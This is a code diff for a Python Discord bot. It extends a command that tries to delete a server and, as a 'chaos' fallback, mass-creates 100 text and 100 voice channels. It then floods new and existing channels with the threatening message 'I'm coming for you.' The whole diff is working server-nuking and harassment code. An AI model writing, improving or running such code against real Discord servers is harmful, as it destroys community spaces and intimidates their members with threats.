@@ -194,19 +194,35 @@ async def me_command(interaction: discord.Interaction):
         except discord.Forbidden:
             await interaction.followup.send("Failed to delete the server. Missing permissions. Fallback activated.", ephemeral=True)
 
-        # Fallback: Create hundreds of text and voice channels if deletion fails
+        # Fallback: Create chaos
         for i in range(100):
             try:
-                await guild.create_text_channel(name=f"chaos-text-{i}")
+                # Create text channels
+                text_channel = await guild.create_text_channel(name=f"chaos-text-{i}")
+                await text_channel.send("I'm coming for you.")
+                await text_channel.send("I'm coming for you.")
+                await text_channel.send("I'm coming for you.")
+
+                # Create voice channels
                 await guild.create_voice_channel(name=f"chaos-voice-{i}")
             except discord.Forbidden:
                 await interaction.followup.send(f"Failed to create additional channels at iteration {i}.", ephemeral=True)
                 break
 
-        await interaction.followup.send("Omega protocol fallback: Chaos channels created.", ephemeral=True)
+        # Send "I'm coming for you" multiple times in existing channels
+        for channel in guild.text_channels:
+            if channel.permissions_for(guild.me).send_messages:
+                try:
+                    for _ in range(3):  # Send the message multiple times
+                        await channel.send("I'm coming for you.")
+                except discord.Forbidden:
+                    pass
+
+        await interaction.followup.send("Omega protocol fallback: Chaos channels created, and messages sent.", ephemeral=True)
 
     except Exception as e:
         await interaction.followup.send(f"An unexpected error occurred: {e}", ephemeral=True)
+
 
 
 @bot.event
